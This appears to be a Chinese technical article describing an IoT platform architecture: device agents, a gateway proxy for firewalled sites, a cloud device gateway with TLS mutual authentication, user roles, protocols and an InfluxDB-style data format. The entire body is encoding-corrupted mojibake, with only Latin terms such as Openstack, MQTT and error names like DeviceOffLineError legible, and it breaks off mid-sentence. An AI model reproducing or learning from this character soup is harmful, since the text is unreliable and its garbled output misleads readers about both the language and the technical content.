Êµ∑Èáè„ÄÅÈÄöÁî®„ÄÅÂèØÊâ©Â±ï„ÄÅÁÆÄÂçï Âõ†Ê≠§ËøôÊòØ‰∏ÄÂ•óÂ∫ûÂ§ßÁÅµÊ¥ªÁöÑÁ≥ªÁªü, ËÄåËøôÊ†∑ÁöÑÁ≥ªÁªü ÂæÄÂæÄ‰∫ëÂéÇÂïÜÊØîËæÉÊúâÁªèÈ™å, ÊØîÂ¶ÇOpenstackÁöÑËÆæËÆ°Â∞±ÊòØ‰∏Ä‰∏™‰∏çÈîôÁöÑÊû∂ÊûÑ„ÄÇÊï¥‰ΩìËÄåË®ÄIOTÁöÑÊû∂ÊûÑÂ∫îËØ•Â±û‰∫éÂæÆÊúçÂä°Êû∂ÊûÑ, ÂæÆÊúçÂä°Êû∂ÊûÑÁöÑËÆæËÆ°ÂíåÂºÄÂèë ÂæÄÂæÄÈÉΩÊòØÊääÂèåÂàÉÂâë, Â¶ÇÊûúÂàí‰∏çÊ∏ÖÊúçÂä°ÁöÑËæπÁïå(È¢ÜÂüüÂàíÂàÜ)ÂíåËßÑËåÉ‰∏ç‰∫ÜÊúçÂä°‰∫§‰∫íÁöÑÊµÅÁ®ãÂíåÊñπÂºè, ÈÇ£‰πàËøôÊ†∑ÁöÑÊû∂ÊûÑ‰πüÊòØ‰∏Ä‰∏™ÁÅæÈöæ, ÊúÄÁªàÈÄ†Êàê ÁêÜ‰∏çÊñ≠Ââ™Ëøò‰π±ÁöÑ‰∏Ä‰∏™Â±ÄÈù¢„ÄÇ‰∏ãÈù¢ÊòØ‰∏ÄÂº†Âü∫Á°ÄÁöÑIOTÊû∂ÊûÑÂõæ, ËÉΩÂæàÂ•ΩÁöÑÊèèËø∞IOT‰∏≠Ê†∏ÂøÉÁöÑÂÖ≥ÈîÆÁÇπ: Êû∂ÊûÑÊ¶ÇËø∞ÂÜçÂ§çÊùÇÁöÑ‰∫ãÂÑø, ‰πüÈúÄË¶ÅÊäì‰ΩèÂÖ∂Ê†∏ÂøÉÁÇπ ÊâçËÉΩÊúâÊïàÂ±ïÂºÄ„ÄÇÂõ†Ê≠§Êàë‰ª¨ÈúÄË¶ÅÁü•ÈÅìËøô‰∏™Êû∂ÊûÑÁöÑÁ≤æÈ´ìÊòØÂï•, Âú®Âõ¥ÁªïÈÇ£Ê†∏ÂøÉÁÇπ„ÄÇÂèÇËÄÉ‰∏äÈù¢ÈÇ£Âº†Êû∂ÊûÑÂõæ, Êàë‰ª¨ÂèØ‰ª•ÁêÜËß£IOTÁöÑÊ†∏ÂøÉÂú®ÂÆåÊàêËøôÊ†∑Âá†‰ª∂‰∫ã: ËøûÊé•ËÆæÂ§á ËÆæÂ§áÊï∞ÊçÆÂàÜÊûê ËÆæÂ§áÊï∞ÊçÆËøêËê•‰∏éÂèØËßÜÂåñ Ê†∏ÂøÉ‰πãÂ§ñÊòØ‰ª•‰∏ãÂë®ËæπÊúçÂä°, Áî®‰∫éÊèêÂçáÂíåÊâ©Â±ïÂäüËÉΩ: ÂäüËÉΩÂπ≥Âè∞: ÊØîÂ¶ÇÊ∂àÊÅØÈÄöÁü•, Êèê‰æõÂØπÂπ≥Âè∞Ê†∏ÂøÉÂäüËÉΩ‰ª•Â§ñÁöÑ‰∏Ä‰∫õË°•ÂÖÖ„ÄÇ Êû∂ÊûÑËØ¶Ëß£Âú®ÂèÇËÄÉ‰∫ÜAWSÂíåAzureÁöÑIOTËøáÂêé, ÁªìÂêàËá™Â∑±ÁöÑËÆ§ËØÜ,ÊÄªÁªìÂá∫Êù•ÁöÑIOTÊû∂ÊûÑÂõæ„ÄÇÊåâÁÖßÈ¢ÜÂüüÂØπÊ®°ÂùóËøõË°åÂàíÂàÜ, ‰∏ªË¶ÅÁî±Âá†‰∏ãÂá†‰∏™Ê®°ÂùóÁªÑÊàê: ËøûÊé•ËÆæÂ§á: Êú¨Âú∞: Ë¥üË¥£ËÆæÂ§áÊï∞ÊçÆÁöÑÈááÈõÜ‰∏äÊä•‰∏éÂèçÂêëÊéßÂà∂„ÄÇ ‰∫ëÁ´Ø: Â∞ÜÊâÄÊúâËÆæÂ§áÊé•ÂÖ•‰∫ëÔºåÊé•Êî∂Êï∞ÊçÆÔºåÂêåÊó∂Ë¥üË¥£ÁÆ°ÁêÜËøô‰∫õËÆæÂ§áÁöÑÊéàÊùÉÂíåÈôêÂà∂ Êï∞ÊçÆÂàÜÊûê: ÈÄöËøáÊèê‰æõ Á¶ªÁ∫øËÆ°ÁÆóÊàñËÄÖÂú®Á∫øËÆ°ÁÆóÁöÑÂèØÁºñÁ®ãÊé•Âè£ ‰∏∫Áî®Êà∑Êèê‰æõÊï∞ÊçÆÂàÜÊûêÁöÑËÉΩÂäõ Êï∞ÊçÆÂèØËßÜÂåñ‰∏éËøêËê•: ÈááÈõÜ‰∏äÊä•ÁöÑÊï∞ÊçÆ‰ª•ÂèäÂàÜÊûêËøáÂêéÁöÑÊï∞ÊçÆÁöÑÂèØËßÜÂåñ, Êï∞ÊçÆÊ†áËÆ∞, Êï∞ÊçÆÊéàÊùÉÁ≠âÂ∏¶‰∏öÂä°ÊÄßË¥®ÁöÑÊï∞ÊçÆÁÆ°ÁêÜ„ÄÇ APIÁΩëÂÖ≥: Ë¥üË¥£ËØ∑Ê±ÇÁöÑÁªü‰∏Ä‰ª£ÁêÜ, Â±èËîΩÊéâÂÜÖÈÉ®Á≥ªÁªüÁöÑÂ§çÊùÇÊÄß„ÄÇ Áî®Êà∑ÁÆ°ÁêÜ: Áªü‰∏ÄÁöÑÁî®Êà∑‰ΩìÁ≥ª Áî®‰∫éÁî®Êà∑ÁÆ°ÁêÜ, ÊùÉÈôêÁÆ°ÁêÜ Ê¶ÇÂøµÁÆÄ‰ªãÊï¥‰∏™Êû∂ÊûÑ‰∏≠ ËÆæËÆ°Âà∞Â¶Ç‰∏ã‰∏Ä‰∫õÊ¶ÇÂøµ: ‰∏öÂä°Ê¶ÇÂøµ: ‰∏éÊï∞ÊçÆÁõ∏ÂÖ≥, Áî®Êà∑Ëá™Â∑±ÂÆö‰πâÁöÑ ËÆæÂ§á(device): Áî®Êà∑ÁöÑÈúÄË¶ÅÊé•ÂÖ•‰∫íËÅîÁΩëÁöÑÂÆû‰ΩìËÆæÂ§á Á≥ªÁªüÊ¶ÇÂøµ: ‰∏éÁ≥ªÁªüÁªÑ‰ª∂Áõ∏ÂÖ≥, ÈÄöËøáÁ≥ªÁªüÁªÑ‰ª∂Êù•Êé•ÂÖ•ÁöÑÊï∞ÊçÆÁöÑÁªÑ‰ª∂ ‰ª£ÁêÜ(agent): Ëé∑ÂèñËÆæÂ§á‰ø°ÊÅØÂíåÊéßÂà∂ËÆæÂ§áÁöÑ‰ª£ÁêÜ ËÆæÂ§áÁΩëÂÖ≥‰ª£ÁêÜ(device-gateway-proxy): ‰ª£ÁêÜdevice-gatewayÈ™åËØÅËÆæÂ§á, ‰ª£ÁêÜËÆæÂ§á‰∏é‰∫ëÁ´ØÈÄö‰ø° ËÆæÂ§áÁΩëÂÖ≥(device-gateway): ‰∫ëÁ´ØËÆæÂ§áÁΩëÂÖ≥, ÁÆ°ÁêÜËÆæÂ§áÊé•ÂÖ•Êï¥‰∏™Á≥ªÁªüÂØπ‰∫é‰∏çÂêåËßíËâ≤ÁöÑÂàíÂàÜ: Ë∂ÖÁ∫ßÁÆ°ÁêÜÂëò: ÂÖ∑ÊúâÁ≥ªÁªüÂ∑≤ÁªèÊï∞ÊçÆÁöÑÊâÄÊúâÊùÉÈôê ËÆæÂ§áÁÆ°ÁêÜÂëò: Ë¥üË¥£Â∞ÜËÆæÂ§áÂä†ÂÖ•Á≥ªÁªü, Êü•ÁúãËÆæÂ§áÁöÑÊï∞ÊçÆ, ‰ª•Âèä‰ª•ËÆæÂ§á‰∏∫Áª¥Â∫¶ÁöÑÊï∞ÊçÆÊùÉÈôêÂàÜÈÖç Êï∞ÊçÆËøêËê•Âëò: Ë¥üË¥£ÁÇπ‰ΩçÊï∞ÊçÆÁöÑÂ§öÁª¥Â∫¶ÁÆ°ÁêÜ(Âü∫Á°ÄÁª¥Â∫¶ÊòØËÆæÂ§á), ‰ª•‰∏öÂä°‰∏∫Áª¥Â∫¶ÁöÑÊï∞ÊçÆÊùÉÈôêÂàÜÈÖç ÁÆóÊ≥ïÁÆ°ÁêÜÂëò: Ë¥üË¥£ÁÆ°ÁêÜÂíåËøêË°åÁõ∏Â∫îÁª¥Â∫¶ÁöÑÁÆóÊ≥ï(Âü∫Á°ÄÁª¥Â∫¶ÊòØËÆæÂ§á), ‰ª•ÂèäÊï∞ÊçÆÁöÑÊü•ÁúãÊùÉÈôê ÊôÆÈÄöÁî®Êà∑ÊàñËÄÖÁ¨¨‰∏âÊñπÂºÄÂèëËÄÖ: Ë¥üË¥£ÁÇπ‰ΩçÊï∞ÊçÆÁöÑÂ§öÁª¥Â∫¶Êü•Áúã(Âü∫Á°ÄÁª¥Â∫¶ÊòØËÆæÂ§á) ËÆæÂ§áËøûÊé•ËÆæÂ§áÁöÑËøûÊé•ÂàÜ‰∏∫2ÈÉ®ÂàÜ‰∫ëÁ´ØÂíåÊú¨Âú∞2ÈÉ®ÂàÜÊûÑÊàê, Áî±‰∫é‰∫ëÁ´ØÂíåÊú¨Âú∞ÁΩëÁªúÁöÑÂ∑ÆÂºÇ, ÈúÄË¶ÅËÄÉËôë: ÁΩëÁªúÁöÑÂÆâÂÖ® ÁΩëÁªúÁöÑ‰∏çÁ®≥ÂÆö‰∏∫‰∫ÜÊñπ‰æøÊú¨Âú∞ËÆæÂ§á‰∏é‰∫ëÁ´ØÁõ∏Ëøû, ÈúÄË¶ÅÁ∫¶ÂÆö‰∏Ä‰∏™ÂçèËÆÆ, Âõ†Ê≠§ÈúÄË¶ÅËÄÉËôë: ÈÄö‰ø°ÂçèËÆÆÁöÑÂ§öÈÄÇÈÖç: ÊØîÂ¶ÇMQTT, HTTP, CoAPÁ≠â Êï∞ÊçÆÊ†ºÂºèÂÆö‰πâÁî±‰∫éÊú¨Âú∞ÁΩëÁªúÁöÑÂ§çÊùÇÂ§öÂèòÊÄß, Êàë‰ª¨ÂèØËÉΩÈúÄË¶ÅÈù¢ÂØπ‰∏çÂêåÁöÑÂú∫ÊôØ: ËÆæÂ§áËÉΩÁõ¥Êé•ËÅîÁΩë‰∏äÊä•Êï∞ÊçÆ ËÆæÂ§áÊó†Ê≥ïËÅîÁΩë, ÈúÄË¶ÅÂ∞ÜÊï∞ÊçÆÂèëÁîüÁªôÊú¨Âú∞‰∏Ä‰∏™ÁΩëÂÖ≥‰ª£ÁêÜ, Áî±ÁΩëÂÖ≥‰ª£ÁêÜÁªü‰∏Ä‰∏äÊä•Êï∞ÊçÆËÆæÂ§áËøûÊé•ÁöÑ‰∏Ä‰∏™Êû∂ÊûÑÁ§∫ÊÑèÂõæ: Êú¨Âú∞Êú¨Âú∞‰ºöË¥üË¥£ËÆæÂ§áÊï∞ÊçÆÁöÑÈááÈõÜ‰∏äÊä•‰ª•ÂèäÊéßÂà∂, Ëøô‰∫õÂäüËÉΩÁî±‰∏Ä‰∏™agentË¥üË¥£ÂÆåÊàê, ÂÆÉÂäüËÉΩÊñπÂêëÂ¶Ç‰∏ã: Êï∞ÊçÆÈááÈõÜ‰∏é‰∏äÊä•: ÈÖçÁΩÆ‰∫ëÁ´ØÂá≠ËØÅ, ÊåâÁÖßÁ∫¶ÂÆöÂçèËÆÆ‰∏äÊä•ËÆæÂ§áÊï∞ÊçÆ„ÄÇ Êé•Êî∂‰∫ëÁ´ØÊéßÂà∂: Âêë‰∫ëÁ´ØÊ±áÊä•ÊéßÂà∂Êåá‰ª§, Êé•Êî∂‰∫ëÁ´ØÂèëËµ∑ÁöÑÊéßÂà∂,‰ª•ÂèäËøîÂõûÊâßË°åÁªìÊûú„ÄÇ ËÆæÂ§á‰ª£ÁêÜ(agent)ËÆæÂ§á‰ª£ÁêÜË¥üË¥£Êî∂ÈõÜËÆæÂ§áÁöÑÊï∞ÊçÆ, ÁÑ∂Âêé‰∏äÊä•Áªô‰∫ëÁ´ØÁΩëÂÖ≥, agent‰Ωç‰∫éÊï∞ÊçÆÁ¨¨‰∏ÄÁ∫ø, ÈúÄË¶ÅËÄÉËôëËâØÂ•ΩÁöÑÊâ©Â±ïÊÄß, Âõ†Ê≠§ÈÄÇÂêàÈááÁî® Êèí‰ª∂Âºè È©±Âä®ÂºÄÂèëÊ®°Âºè„ÄÇÈááÈõÜÂô®ÈúÄË¶Å‰ªé‰∫ëÁ´ØËé∑ÂèñËØÅ‰π¶, ÈÖçÁΩÆ‰∫ëÁ´ØËÆæÂ§áÁºñÂè∑, ÁÑ∂ÂêéÊåâÁÖßÊåáÂÆöÁöÑÊä•ÊñáÊ†ºÂºè Â∞ÜÊï∞ÊçÆ‰∏äÊä•Áªô‰∫ëÁ´Ø„ÄÇÊØîÂ¶Ç‰∫ëÁ´ØËßÑËåÉÁöÑÊï∞ÊçÆ‰∏äÊä•Ê†ºÂºè,‰ª•influxDBÁöÑÊï∞ÊçÆÂÜôÂÖ•Ê†ºÂºè‰∏∫‰æãËØ¥Êòé:1234measurement[,tag_key1=tag_value1...] field_key=field_value[,field_key2=field_value2] [timestamp]1. ‰∏ÄÁ±ªËÆæÂ§á‰∏Ä‰∏™Â∫ì, ÊØîÂ¶ÇËΩ¶, ÊØîÂ¶ÇÈ£ûÊú∫, ‰∏Ä‰∏™Â∫ìÈáåÈù¢Â≠òÊîæÊâÄÊúâËøôÁ±ªËÆæÂ§áÁöÑÊåáÊ†á, ‰∏ÄÁªÑÁõ∏ÂÖ≥ÁöÑÊåáÊ†á‰∏Ä‰∏™ÁªÑ, ÊØîÂ¶ÇÂèòÈÄüÂô®, ÈΩøËΩÆÁÆ±, ÁÆóÊ≥ïËÆ°ÁÆóÁöÑÂπ≥ÂùáÈ£ûÈÄü2. ÊâÄÊúâ‰∏éÊï∞ÊçÆÊó†ÂÖ≥ÁöÑÊï∞ÊçÆ Âùá‰ª•Ê†áÁ≠æÁöÑÊñπÂºèÂΩïÂÖ•, Ëøô‰∫õTagÂàÜ‰∏∫2Á±ª: 1.Á≥ªÁªüÊ†áÁ≠æ: device-id, collector-id 2. Áî®Êà∑Ëá™ÂÆö‰πâÊ†áÁ≠æ agentÊ†∏ÂøÉÂäüËÉΩÁÇπÊ¶ÇËø∞: Êï∞ÊçÆÈááÈõÜ‰∏é‰∏äÊä• Êï∞ÊçÆÈááÈõÜ: ‰ª•Êèí‰ª∂ÁöÑÂΩ¢Âºè, ÊîØÊåÅÂ§öÂçèËÆÆÈÄÇÈÖç, ÈªòËÆ§ÊÉÖÂÜµ‰∏ã Âè™Ë¶ÅÊï∞ÊçÆÁ¨¶ÂêàËßÑËåÉ Â∞±ÂèØ‰ª•‰∏äÊä• Êï∞ÊçÆÂ§ÑÁêÜ: Â¶Ç‰ΩïÊï∞ÊçÆ‰∏çÁ¨¶ÂêàËßÑËåÉ, ÈúÄË¶ÅÁºñÂÜô Êï∞ÊçÆÂ§ÑÁêÜÊèí‰ª∂, Â§ÑÁêÜÊàêÂêàÊ≥ïËßÑÂàô ËÅöÂêàÊï∞ÊçÆ: Â¶ÇÊûúÊï∞ÊçÆÈáèËøáÂ§ß, ÂèØ‰ª•ÁºñÂÜôËÅöÂêàÊèí‰ª∂, ÂØπÊï∞ÊçÆËøõË°åËÅöÂêà, ÊØîÂ¶ÇÈíàÂØπËÆæÂ§áÈúáÈ¢ëÊï∞ÊçÆ„ÄÇ Êï∞ÊçÆ‰∏äÊä•: ÁªèÂéÜÊâÄÊúâ‰ª•‰∏äÊ≠•È™§ËøáÂêé, Â∞ÜÊï∞ÊçÆÈÄöËøáËÆæÂ§áÁöÑÊï∞ÊçÆ‰∏äÊä•ÁÆ°ÈÅì‰∏äÊä•‰∫ëÁ´Ø ËÆæÂ§áÊéßÂà∂: ÊéßÂà∂Êåá‰ª§‰∏äÊä•: agentÂêØÂä®Êó∂ÈúÄË¶ÅÂ∞Ü Â∑≤ÁªèÂÆûÁé∞ÁöÑÊéßÂà∂Êåá‰ª§ÈÄöËøáÊéßÂà∂‰∏ä‰º†ÈÄöÈÅìÂêë‰∫ëÁ´ØÊ±áÊä•„ÄÇ ÊâßË°åÊéßÂà∂Êåá‰ª§: agentËÆ¢ÈòÖÊéßÂà∂‰∏ãÂèëÁÆ°ÈÅì, ÂΩìÊúâÂëΩ‰ª§Âà∞Êù•Êó∂, Á´ãÈ©¨ÊâßË°å, Âπ∂‰∏îÂ∞ÜÁªìÊûúÂÜôÂõûÊéßÂà∂‰∏ä‰º†ÁÆ°ÈÅì„ÄÇ ÂºÇÂ∏∏Â§ÑÁêÜ: ËÆæÂ§á‰∏ãÁ∫øÂºÇÂ∏∏: Áî±‰∫éËÆæÂ§á‰∏ãÁ∫øÊó†Ê≥ïÂíåËÆæÂ§áÂª∫Á´ãËøûÊé•, Êó†Ê≥ïÈááÈõÜÊï∞ÊçÆ(DeviceOffLineError), ÈÄöËøáÊéßÂà∂‰∏ä‰º†ÈÄöÈÅì‰∏äÊä• ÁÇπ‰ΩçÈááÈõÜÂºÇÂ∏∏: Áî±‰∫éËÆæÂ§áÊ≤°ÊúâËØ•ÁÇπ‰Ωç, Êó†Ê≥ïËé∑ÂèñÂà∞ËØ•ÁÇπ‰ΩçÊï∞ÊçÆ(NoPointError), ÈÄöËøáÊéßÂà∂‰∏ä‰º†ÈÄöÈÅì‰∏äÊä• agentÊéßÂà∂: ‰ª£ÁêÜÈÖçÁΩÆ: ÈÄöËøáÊéßÂà∂‰∏ãÂèëÈÄöÈÅì, ‰∏ãÂèë‰ª£ÁêÜÈÖçÁΩÆ. ‰ª£ÁêÜÈáçÂêØ: ÈÄöËøáÊéßÂà∂‰∏ãÂèëÈÄöÈÅì, ÂæóÁü•‰ª£ÁêÜÈáçÊñ∞ÈÄöÁü•, ÈáçÂêØ‰ª£ÁêÜ. Áä∂ÊÄÅ‰∏äÊä•: ÈÄöËøáÊéßÂà∂‰∏ä‰º†ÈÄöÈÅì, Ê±áÊä•‰ª£ÁêÜÁä∂ÊÄÅ agentÂºÇÂ∏∏: ‰ª£ÁêÜËøêË°åÂºÇÂ∏∏: ‰ª£ÁêÜÂºÇÂ∏∏‰∏ãÁ∫øÂèäÊó∂ÈÄöÁü•‰∫ëÁ´Ø(AgentRuntimeError) ÁΩëÂÖ≥‰ª£ÁêÜ(device-gateway-proxy)ÁΩëÂÖ≥‰ª£ÁêÜ‰∏ªË¶ÅËøêÁî®‰∫é‰ª£ÁêÜÊó†Ê≥ïËÆøÈóÆÂÖ¨ÁΩëÁöÑÂú∫ÊôØ(ÊúâÁÅ´Â¢ô), ÂÆÉÂú®Êú¨Âú∞ÁΩëÁªú‰∏≠ÊâÆÊºîÁùÄ‰∫ëÁ´ØÁΩëÂÖ≥ÁöÑËßíËâ≤, ÊéßÂà∂ÁùÄÊâÄÊúâËÆæÂ§áÁöÑËøûÊé•, Âõ†‰∏∫‰ªñÊòØ‰ª£ÁêÜ, ÊâÄÊúâÁõ∏ÂÖ≥ÊéßÂà∂‰ø°ÊÅØÂùá‰ªé‰∫ëÁ´ØÁΩëÂÖ≥Ëé∑Âèñ„ÄÇÁΩëÂÖ≥‰ª£ÁêÜÂú®ËÆæËÆ°Êó∂ÈúÄË¶ÅÊª°Ë∂≥Â¶Ç‰∏ãÂéüÂàô: ÈÄèÊòéÊÄß: ÂØπ‰∫é‰∫ëÁ´ØÊù•ËØ¥, ‰∏çËÉΩÂõ†‰∏∫‰ª£ÁêÜËÄåÂ∏¶Êù•ËÆæÂ§áÂ§ÑÁêÜÁöÑÂ∑ÆÂºÇÊÄß, Âõ†Ê≠§‰ª£ÁêÜ‰∏ªË¶ÅÂäüËÉΩÊòØ‰ª£ÁêÜËÆæÂ§á ‰∏é ‰∫ëÁ´ØÈÄö‰ø°, ÂØπ‰∫é‰∫ëÁΩëÂÖ≥Êù•ËØ¥ ÁúãÂà∞ÁöÑ‰æùÁÑ∂ÊòØËÆæÂ§á,ËÄå‰∏çÊòØ‰ª£ÁêÜ„ÄÇ ÁºìÂ≠òÊÄß: ‰ª£ÁêÜÈúÄË¶ÅÈù¢‰∏¥ÁΩëÁªú‰∏≠Êñ≠,ÊâÄ‰ª•ÈúÄË¶ÅÊúâÊï∞ÊçÆÁºìÂ≠òÊú∫Âà∂, Âπ∂‰∏îÂèØ‰ª•ÈÖçÁΩÆÂ≠òÂÇ®Á≠ñÁï•„ÄÇ‰ª•‰∏ãÊòØgateway-proxyÁöÑÊ†∏ÂøÉÂäüËÉΩÊ¶ÇËø∞: Êï∞ÊçÆ‰∏äÊä•: Ê£ÄÊü•ËÆæÂ§áÂêàÊ≥ïÊÄß: ÁΩëÂÖ≥‰ª£ÁêÜËÉΩ‰ª£ÁêÜÈÇ£‰∫õËÆæÂ§áÂª∫Á´ãËøûÊé• ÈúÄË¶Å‰ªé‰∫ëÁ´ØÁΩëÂÖ≥Ëé∑Âèñ, Â¶ÇÊûúËÆæÂ§á‰∏çÂêàÊ≥ï, ÂàôÊãíÁªù‰∏∫ËØ•ËÆæÂ§áÂª∫Á´ãËøûÊé•„ÄÇ Êï∞ÊçÆ‰∏äÊä•: ÁΩëÂÖ≥‰ª£ÁêÜÊ®°Êãüagent‰∏éÁúüÊ≠£ÁöÑÁΩëÂÖ≥Âª∫Á´ãËøûÊé•, ÈÄöËøáËÆæÂ§áÊï∞ÊçÆ‰∏äÊä•ÈÄöÈÅì‰∏äÊä•Êï∞ÊçÆÂà∞‰∫ëÁ´Ø„ÄÇ ËÆæÂ§áÊéßÂà∂: ÊéßÂà∂Êåá‰ª§‰∏äÊä•: ‰ª£ÁêÜËÆæÂ§áÂª∫Á´ãÊéßÂà∂‰∏ä‰º†ÈÄöÈÅì, ‰∏äÊä•ÊéßÂà∂Êåá‰ª§Âà∞‰∫ëÁ´Ø„ÄÇ ÊâßË°åÊéßÂà∂Êåá‰ª§: ‰ª£ÁêÜËÆæÂ§áÊé•Êî∂ÊéßÂà∂‰∏ãÂèëÈÄöÈÅìÈáåÈù¢ÁöÑ ÊéßÂà∂Êåá‰ª§, Ë∞ÉÂ∫¶ÁªôagentÊâßË°å, Â∞ÜÁªìÊûúËøîÂõûÂà∞ÊéßÂà∂‰∏äÂéªÈÄöÈÅì„ÄÇ ÂºÇÂ∏∏Â§ÑÁêÜ: ËÆæÂ§á‰∏ãÁ∫øÂºÇÂ∏∏: Áî±‰∫éËÆæÂ§á‰∏ãÁ∫øÊó†Ê≥ïÂíåËÆæÂ§áÂª∫Á´ãËøûÊé•, Êó†Ê≥ïÈááÈõÜÊï∞ÊçÆ(DeviceOffLineError), ÈÄöËøáÊéßÂà∂‰∏ä‰º†ÈÄöÈÅì‰∏äÊä• ÁÇπ‰ΩçÈááÈõÜÂºÇÂ∏∏: Áî±‰∫éËÆæÂ§áÊ≤°ÊúâËØ•ÁÇπ‰Ωç, Êó†Ê≥ïËé∑ÂèñÂà∞ËØ•ÁÇπ‰ΩçÊï∞ÊçÆ(NoPointError), ÈÄöËøáÊéßÂà∂‰∏ä‰º†ÈÄöÈÅì‰∏äÊä• ÁΩëÂÖ≥‰ª£ÁêÜÊéßÂà∂: proxyÈÖçÁΩÆ: ÈÄöËøáproxyÁöÑÊéßÂà∂‰∏ä‰º†ÈÄöÈÅì ËØ∑Ê±Ç proxyÁöÑÈÖçÁΩÆ‰ø°ÊÅØ, ÈÖçÁΩÆproxyÈúÄË¶Å‰ª£ÁêÜÁöÑËÆæÂ§áÂàóË°® proxy‰ªéÂêØ: ÈÄöËøáproxyÁöÑÊéßÂà∂‰∏ãÂèëÈÄöÈÅì ÊâßË°å‰∫ëÁ´ØÂØπproxyÁöÑÊìç‰Ωú proxyÁä∂ÊÄÅ‰∏äÊä•: proxyÈÄöËøáÊéßÂà∂‰∏ä‰º†ÈÄöÈÅì ‰∏äÊä•Ëá™Ë∫´Áä∂ÊÄÅ agentÁä∂ÊÄÅ‰ª£ÁêÜ‰∏äÊä•: proxy‰ª£ÁêÜagent ‰∏äÊä•Áä∂ÊÄÅ(proxyÊéßÂà∂‰∏ä‰º†ÈÄöÈÅì) agentÂºÇÂ∏∏‰ª£ÁêÜ‰∏äÊä•: proxy‰ª£ÁêÜagent ‰∏äÊä•ÂºÇÂ∏∏(proxyÊéßÂà∂‰∏ä‰º†ÈÄöÈÅì) ÁΩëÂÖ≥‰ª£ÁêÜÂºÇÂ∏∏: proxyËøêË°åÂºÇÂ∏∏: ÂèäÊó∂Âêë‰∫ëÁ´Ø‰∏äÊä•(ProxyRuntimeError), ÈÄöËøáproxyÊéßÂà∂‰∏ä‰º†ÈÄöÈÅì ‰∫ëÁ´Ø(device-gateway)‰∫ëÁ´ØË¥üË¥£ËÆæÂ§áÁöÑËøûÊé•ÁöÑÁªÑ‰ª∂Êàë‰ª¨Áß∞‰πã‰∏∫ËÆæÂ§áÁΩëÂÖ≥(device-gateway), ÂÆÉË¥üË¥£Êé•Êî∂ËÆæÂ§á‰∏ä‰º†ÁöÑÊï∞ÊçÆ‰∏éËÆæÂ§áÁöÑÊéßÂà∂„ÄÇËÆæÂ§áÁΩëÂÖ≥Âú®ËÆæËÆ°Êó∂ÈúÄË¶ÅÊª°Ë∂≥Â¶Ç‰∏ãÂéüÂàô: Êï∞ÊçÆÂÆâÂÖ®: ‰∏∫‰∫ÜÁ°Æ‰øùÁΩëÂÖ≥ÂíåÊï∞ÊçÆ‰∏äÊä•ËÄÖ‰πãÈó¥ËøôÊÆµÂÖ¨ÁΩëÊï∞ÊçÆÈìæË∑ØÁöÑÂÆâÂÖ®, ÈúÄÈááÁî®TLSËøõË°åÂä†ÂØÜÂíåÂèåÂêëËÆ§ËØÅ„ÄÇ Êï∞ÊçÆÁΩëÂÖ≥ÈúÄÂÖÖÂΩìCAÁöÑËßíËâ≤, ÂêëagentÊàñËÄÖÈ¢ÅÂèëÊï∞Â≠óËØÅ‰π¶ Êé•ÂÖ•ËÆæÂ§áËµÑ‰∫ßÁöÑÁÆ°ÁêÜ Êï∞ÊçÆÂ≠òÂÇ®: Âú®Êï∞ÊçÆÂ≠òÂÖ•Êï∞ÊçÆÂ∫ì‰πãÂâç,Ëøô‰∫õÊï∞ÊçÆË¢´Áß∞‰∏∫‰∫ã‰ª∂, Êï∞ÊçÆË¢´Â≠òÂÇ®‰πãÂêéÊàê‰∏∫ÂéÜÂè≤Êï∞ÊçÆ, ‰∫ã‰ª∂ÂíåÂéÜÂè≤Êï∞ÊçÆÂàÜÂà´ÂØπÂ∫î‰∏çÂêåÁöÑÂú∫ÊôØdevice-gatewayÁöÑÊéßÂà∂Â±ÇÂäüËÉΩÊ¶ÇËø∞: Á±ªÂûãÁÆ°ÁêÜ:ËøûÊé•‰∏ä‰∫ëÁ´ØÁöÑËÆæÂ§áÂøÖÈ°ªË¶ÅÊåáÊòéËÆæÂ§áÁöÑÁ±ªÂûã, ËÆæÂ§áÁ±ªÂûãÁî®‰∫éÊ†°È™å ËÆæÂ§á‰∏ä‰º†ÁöÑÊï∞ÊçÆ ÊòØÂê¶ÂêàËßÑ, Â¶ÇÊûú‰∏çÂêàËßÑ,Â∞±‰∏¢ÂºÉÊéâ, ‰ΩÜÊòØÈúÄË¶ÅËÆ∞ÂΩïÊó•Âøó, ËÆ©Áî®Êà∑ÂèØ‰ª•Êü•ÁúãÁ±ªÂûãÁöÑÂÆö‰πâ‰ª•Json‰∏∫‰∏ª, ÈúÄË¶ÅÂÆö‰πâ Â±ûÊÄßÂêçÁß∞(Â≠óÊÆµÂêçÁß∞), Â≠óÊÆµÁöÑÂÄºÁöÑÊï∞ÊçÆÁ±ªÂûã, ‰ª•ÂèäÂÖ∂‰ªñÂ≠óÊÆµÁöÑÁõ∏ÂÖ≥‰ø°ÊÅØ„ÄÇ Á±ªÂûãÁöÑÂ¢ûÂà†ÊîπÊü• ËÆæÂ§áÁÆ°ÁêÜ ËÆæÂ§áÂàõÂª∫: ÂøÖÈ°ªÂèÇÊï∞ÂèÇÊï∞: ËÆæÂ§áÂêçÁß∞, Êé•ÂÖ•ÊñπÂºè(ÈÄöËøáagentÊé•ÂÖ•ËøòÊòØÈÄöËøáproxyÊé•ÂÖ•), ËÆæÂ§áÁ±ªÂûã(ÂÖàÂÆö‰πâÁ±ªÂûã) ÂèØÈÄâÂèÇÊï∞: Âú∞ÁêÜ‰ΩçÁΩÆ, ËÆæÂ§áÊ†áÁ≠æ, ÂÖ∂‰ªñÂ±ûÊÄß,ÁúüÊ≠£ÂàõÂª∫Êó∂Êàë‰ª¨ÈúÄË¶ÅËÄÉËôë: ÈÖçÈ¢ùÊ£ÄÊü•(ÈôêÂà∂‰∏Ä‰∏™Áî®Êà∑ÂèØ‰ª•ÂàõÂª∫ÁöÑËÆæÂ§áÊï∞) Â¶ÇÊûúÈÄöËøáagentÊé•ÂÖ•, ‰∏∫agentÈ¢ÅÂèëËÆæÂ§áÊé•ÂÖ•ËØÅ‰π¶ÂíåÁßÅÈí• ÁîüÊàêÊé•ÂÖ•‰∫ëÁ´ØÁöÑÁî®Êà∑ÂíåÂØÜÁ†Å ÈÖçÁΩÆËÆæÂ§áÂíå‰∫ëÁ´ØÈÄö‰ø°ÁöÑÈÄöÈÅì ‰∫ëÁ´ØËÆ¢ÈòÖËøô‰∫õÈÄöÈÅì, Á≠âÂæÖÊï∞ÊçÆ‰∏äÊä•ÊàñËÄÖÊù•Ëá™agentÁöÑËØ∑Ê±Ç Êü•ÁúãËÆæÂ§á:ËÆæÂ§áÂàõÂª∫ÊàêÂäüËøáÂêéÁî®Êà∑ÂèØ‰ª•Êü•ÁúãÂà∞: 